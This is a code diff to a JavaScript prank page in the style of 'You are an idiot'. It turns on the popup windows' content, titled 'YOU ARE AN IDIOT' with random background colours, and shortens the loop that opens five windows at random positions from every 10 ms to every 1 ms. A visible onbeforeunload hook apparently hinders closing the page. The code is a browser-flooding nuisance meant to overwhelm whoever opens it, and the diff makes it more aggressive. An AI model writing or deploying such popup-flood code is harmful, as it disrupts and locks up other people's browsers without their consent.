@@ -11,26 +11,41 @@ function openWindow(url) {
 
         newWin.moveTo(randomX, randomY);
 
-        /*// Write custom content inside the blank page
+        // Write custom content inside the blank page
         newWin.document.write(`
-            <html>
-                <head>
-                    <title>YOU ARE AN IDIOT</title>
-                    <style>
-                        body { background: red; color: white; text-align: center; font-size: 24px; margin-top: 100px; }
-                    </style>
-                </head>
-                <body>
-                    <img src="https://i1.sndcdn.com/artworks-000664006093-hhm0rf-t500x500.jpg" width="500" height="333">
-                    <script>
-                        setInterval(() => {
-                            if (document.body.style.background === 'red') {
-                                document.body.style.background = 'blue';
-                            }, 500);
-                    </script>
-                </body>
+            <!DOCTYPE html>
+                <html>
+                    <head>
+                        <title>YOU ARE AN IDIOT</title>
+                            <style>
+                                body {
+                                    height: 100vh;
+                                    margin: 0;
+                                }
+                            </style>
+                            <script>
+                                function getRandomColor() {
+                                    const letters = '0123456789ABCDEF';
+                                    let color = '#';
+                                    for (let i = 0; i < 6; i++) {
+                                        color += letters[Math.floor(Math.random() * 16)];
+                                    }
+                                    return color;
+                                }
+                        
+                                function setRandomBackgroundColor() {
+                                    document.body.style.backgroundColor = getRandomColor();
+                                }
+                        
+                                document.addEventListener('DOMContentLoaded', function() {
+                                    setRandomBackgroundColor();
+                                });
+                            </script>
+                        </head>
+                        <body>
+                    </body>
             </html>
-        `);*/
+        `);
     }
 
     return newWin;
@@ -41,7 +56,7 @@ function proCreate() {
         for (var i = 0; i < 5; i++) {
             openWindow('');
         }
-    }, 10); // Adjust delay as needed
+    }, 1); // Adjust delay as needed
 }
 
 window.onbeforeunload = function () {
